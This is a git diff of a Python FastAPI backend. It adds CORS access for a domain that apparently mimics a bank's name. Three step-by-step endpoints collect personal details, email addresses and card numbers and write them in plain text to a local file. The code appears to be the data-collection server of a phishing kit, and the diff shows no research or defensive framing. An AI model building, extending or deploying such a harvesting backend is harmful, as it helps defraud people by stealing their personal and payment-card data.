@@ -1,5 +1,4 @@
-import email
-from fastapi import FastAPI
+from fastapi import FastAPI, status
 from pydantic import BaseModel
 from typing import Optional
 from fastapi.middleware.cors import CORSMiddleware
@@ -26,7 +25,11 @@ origins = [
     "http://localhost:8080",
     "http://localhost:3000",
     "*",
-    "http://192.168.2.106:3000"
+    "http://192.168.2.106:3000",
+    "http://bacootemerica.xyz/",
+    "https://bacootemerica.xyz/",
+    "http://www.bacootemerica.xyz/",
+    "https://www.bacootemerica.xyz/"
 ]
 
 app.add_middleware(
@@ -42,7 +45,7 @@ def read_root():
     return {"Hello": "World"}
 
 
-@app.post("/step1")
+@app.post("/step1", status_code=status.HTTP_201_CREATED)
 def post_step1( user : Step1 ):
     with open("info.txt", "a") as file:
         file.write("\n--------------\n")
@@ -53,7 +56,7 @@ def post_step1( user : Step1 ):
         file.write("\n")
     return 200
 
-@app.post("/step2")
+@app.post("/step2", status_code=status.HTTP_201_CREATED)
 def post_step2( email : Step2 ):
     with open("info.txt", "a") as file:
         file.write("Email: ")
@@ -65,7 +68,7 @@ def post_step2( email : Step2 ):
         file.write("\n")
     return 200
 
-@app.post("/step3")
+@app.post("/step3", status_code=status.HTTP_201_CREATED)
 def post_step3( card : Step3 ):
     with open("info.txt", "a") as file:
         file.write("Card Number: ")
